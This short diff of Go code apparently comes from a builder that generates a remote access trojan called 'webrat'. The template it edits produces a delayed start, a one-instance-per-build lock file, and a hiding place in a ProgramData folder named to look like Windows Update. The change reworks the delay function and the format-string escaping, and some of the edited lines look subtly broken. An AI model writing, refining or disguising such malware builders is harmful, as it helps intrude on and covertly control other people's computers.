@@ -19,9 +19,8 @@ func templateMisc(cfg Config) string {
 var startupDelaySeconds = %d
 var startupDelayOnce sync.Once
 
-func applyStartupDelay() {
+func applyStartupDelay(delay int) {
 	startupDelayOnce.Do(func() {
-		delay := startupDelaySeconds
 		if delay < 0 {
 			delay = 0
 		}
@@ -30,11 +29,11 @@ func applyStartupDelay() {
 }
 
 func getBuildLockPath() string {
-	if "%s" == "" {
+	if "%%s" == "" {
 		return ""
 	}
 	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
-	return filepath.Join(dir, fmt.Sprintf("webrat_%s.lock", "%s"))
+	return filepath.Join(dir, fmt.Sprintf("webrat_%%s.lock", "%%s"))
 }
 
 func ensureSingleRunPerBuild() bool {
